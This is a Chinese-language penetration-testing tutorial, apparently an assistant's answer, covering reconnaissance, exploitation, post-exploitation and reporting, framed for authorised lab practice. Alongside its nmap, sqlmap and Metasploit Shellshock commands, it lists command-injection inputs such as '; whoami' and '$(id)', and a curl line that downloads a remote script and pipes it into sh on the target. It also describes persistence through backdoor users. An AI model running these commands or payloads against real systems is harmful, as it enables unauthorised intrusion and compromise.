**重要声明：以下所有技术和命令仅用于授权的安全测试、教育目的和安全研究。在未获得明确书面授权的情况下，对任何系统进行扫描或测试都是非法的。请务必在您拥有完全权限的实验室环境（如 VulnHub, HackTheBox, 或自己搭建的靶机）中进行实践。**

---

### 渗透测试标准流程 (Phases)

一个完整的渗透测试通常包含以下阶段，我们将围绕这些阶段展开命令和步骤：

1.  **信息收集 (Information Gathering)**
2.  **漏洞分析 (Vulnerability Analysis)**
3.  **漏洞利用 (Exploitation)**
4.  **后渗透攻击 (Post-Exploitation)**
5.  **报告撰写 (Reporting)**

---

### 第一阶段：信息收集 (Information Gathering)

这是最关键的一步，信息收集的深度直接决定后续步骤的成功率。

#### 1. 主机发现确认
首先确认目标是否在线以及基本的网络信息。
```bash
ping -c 4 <目标IP>  # Linux/Mac
ping -n 4 <目标IP>  # Windows
```

#### 2. 端口扫描 (Port Scanning) - 你的第一步
使用 `Nmap` 进行全方位扫描，这是你的核心侦察工具。

**a) 全面扫描（获取最丰富信息）**
```bash
sudo nmap -sS -sV -sC -O -A -p- <目标IP> -oA full_scan
```
*   `-sS`: SYN  stealth 扫描，速度快且隐蔽。
*   `-sV`: 探测服务版本。
*   `-sC`: 使用默认的 Nmap 脚本进行更深入的发现。
*   `-O`: 尝试识别操作系统。
*   `-A`:  Aggressive mode，相当于 `-sV -sC -O` 的集合。
*   `-p-`: 扫描所有 65535 个端口。
*   `-oA full_scan`: 将结果以三种格式（normal, XML, grepable）输出，文件名前缀为 `full_scan`。

**b) 如果全面扫描太慢或太吵，可以先进行快速扫描**
```bash
sudo nmap -sS -sV -sC <目标IP> -oA quick_scan
# 或者只扫描前1000个端口的版本信息
sudo nmap -sV <目标IP>
```

**c) UDP端口扫描（非常重要，但很慢）**
```bash
sudo nmap -sU --top-ports 100 <目标IP> -oU udp_scan
# 扫描最常见的100个UDP端口，如DNS(53), DHCP(67,68), SNMP(161)等。
```

**分析Nmap结果：**
扫描完成后，打开 `full_scan.nmap` 文件查看。你需要重点关注：
*   **开放了哪些端口？**
*   **端口上运行着什么服务？版本号是多少？** (e.g., `OpenSSH 8.2p1`, `Apache httpd 2.4.41`)
*   **操作系统可能是什么？** (e.g., `Linux 3.2 - 4.9`)
*   **Nmap脚本发现了什么有趣的信息？** (e.g., HTTP标题、匿名FTP登录、SMB共享枚举)

#### 3. 网络基础设施信息收集
```bash
# 1.  traceroute (路由跟踪)
traceroute <目标IP>  # Linux/Mac
tracert <目标IP>     # Windows

# 2. WHOIS 查询 (查询IP注册信息)
whois <目标IP> | tee whois.txt

# 3. DNS 枚举 (如果目标是域名而非直接IP)
# 使用 `dig` 或 `nslookup`
dig any @8.8.8.8 <目标域名>      # 查询所有DNS记录
dig axfr @<目标DNS服务器> <目标域名> # 尝试DNS区域传输（通常失败，但值得一试）
```

#### 4. Web服务深入侦察（如果开放了80/443/8080等端口）
如果发现HTTP/HTTPS服务，这是最重要的攻击面之一。

**a) 目录和文件发现 (Dirbusting)**
使用工具暴力破解隐藏的路径和文件。
```bash
# 使用 Gobuster (快)
gobuster dir -u http://<目标IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster_scan.txt

# 使用 Dirb (经典)
dirb http://<目标IP> /usr/share/wordlists/dirb/common.txt -o dirb_scan.txt

# 使用 FFuf (更快更灵活)
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<目标IP>/FUZZ -o ffuf_scan.html -of html
```

**b) Web应用指纹识别**
```bash
# 使用 WhatWeb
whatweb http://<目标IP> -v

# 使用 Wappalyzer (浏览器插件，非常好用)
# 直接在浏览器中访问网站即可使用
```

**c) 手动检查**
*   用浏览器访问网站，查看源代码。
*   检查 `robots.txt` 文件。
*   检查 `/.git/` 目录是否暴露。
*   查看所有链接和表单。

---

### 第二阶段：漏洞分析 (Vulnerability Analysis)

根据信息收集的结果，寻找已知的漏洞。

#### 1. 搜索公开漏洞
*   **搜索引擎技巧**: `Apache 2.4.41 exploit`, `OpenSSH 8.2p1 vulnerability`
*   **漏洞数据库**:
    *   [Exploit-DB](https://www.exploit-db.com/)
    *   [NVD (National Vulnerability Database)](https://nvd.nist.gov/)
    *   [CVE Details](https://www.cvedetails.com/)

#### 2. 使用自动化漏洞扫描器
**警告**: 这些工具噪音极大，极易被防御系统发现。

**a) Nessus / OpenVAS (GVM)**
最专业的漏洞扫描器，需要单独安装和配置。它会给出详细的CVE编号和风险评级。

**b) Nikto (针对Web服务器)**
```bash
nikto -h http://<目标IP> -o nikto_scan.txt
```

**c) Nmap 漏洞脚本**
Nmap自带大量强大的漏洞扫描脚本。
```bash
# 检查SMB漏洞
sudo nmap --script smb-vuln* -p 445 <目标IP>

# 检查HTTP漏洞
sudo nmap --script http-vuln* -p 80,443 <目标IP>

# 检查所有已知漏洞脚本
sudo nmap --script vuln <目标IP>
```

---

### 第三阶段：漏洞利用 (Exploitation)

这是实际获取系统访问权限的阶段。

#### 1. 利用公开的Exp
在Exploit-DB找到漏洞利用代码(Exploit)。
```bash
# 在Kali中搜索
searchsploit "Apache 2.4.41"
```
下载对应的Exp文件，仔细阅读其说明，通常需要用Python/Ruby运行，并按要求修改目标IP和端口。

#### 2. 使用 Metasploit Framework (MSF)
这是最强大的渗透测试框架，集成了大量Exploit和Payload。
```bash
# 启动MSF
msfconsole

# 在MSF内搜索漏洞模块
msf6 > search type:exploit name:apache

# 使用一个模块
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec

# 显示需要设置的参数
msf6 exploit(...) > show options

# 设置参数
msf6 exploit(...) > set RHOSTS <目标IP>
msf6 exploit(...) > set TARGETURI /cgi-bin/test.sh

# 运行攻击
msf6 exploit(...) > run
# 或者
msf6 exploit(...) > exploit

# 如果成功，你将获得一个Meterpreter shell。
```

#### 3. 利用Web漏洞
*   **SQL注入**: 使用 `sqlmap`
    ```bash
    sqlmap -u "http://<目标IP>/page.php?id=1" --batch --dbs
    ```
*   **文件上传漏洞**: 上传一个Web Shell (如PHP一句话木马)，然后用浏览器或工具连接。
*   **命令注入**: 尝试在参数中拼接系统命令 (`; whoami`, `| id`, `$(id)`)。

---

### 第四阶段：后渗透攻击 (Post-Exploitation)

一旦获得初始访问权限（一个shell），接下来的目标是：

1.  **稳定Shell**: 将不稳定的shell升级为完全交互式的TTY。
    ```bash
    # 在获得的简单shell中执行
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    (Ctrl+Z) # 回到本地终端
    stty raw -echo; fg # 输入后按两次回车
    export TERM=xterm
    ```

2.  **权限提升 (Privilege Escalation)**:
    *   **内核漏洞**: 搜索本地Exp (e.g., `DirtyCow`, `DirtyPipe`)。使用脚本自动化搜索：
        ```bash
        # 上传并运行 LinPEAS (最强Linux提权脚本)
        # 在目标机上： curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
        ```
    *   **错误配置**: 检查SUID文件、sudo权限、计划任务、世界可写文件等。LinPEAS也会检查这些。

3.  **横向移动 (Lateral Movement)**:
    *   在系统内部搜集密码、密钥、配置文件。
    *   尝试用找到的密码连接其他机器（密码重用）。
    *   破解密码哈希。

4.  **持久化 (Persistence)**:
    *   添加SSH密钥。
    *   创建计划任务或系统服务。
    *   创建后门用户。

---

### 第五阶段：报告撰写 (Reporting)

这是最重要的一步，向客户清晰展示风险。

1.  **执行摘要 (Executive Summary)**: 用非技术语言描述发现的风险及其业务影响。
2.  **技术细节 (Technical Findings)**: 对每个漏洞详细描述：
    *   漏洞名称和风险等级 (Critical, High, Medium, Low)
    *   受影响的资产 (IP, URL)
    *   详细描述和证明 (截图、命令输出)
    *   修复建议
3.  **附录**: 包含完整的工具输出（Nmap, Nikto等）以供技术人员参考。

这个过程是迭代和循环的。在后期阶段获得的新信息（例如内网IP）可能会让你回到第一阶段，对新的目标进行信息收集。祝你学习顺利！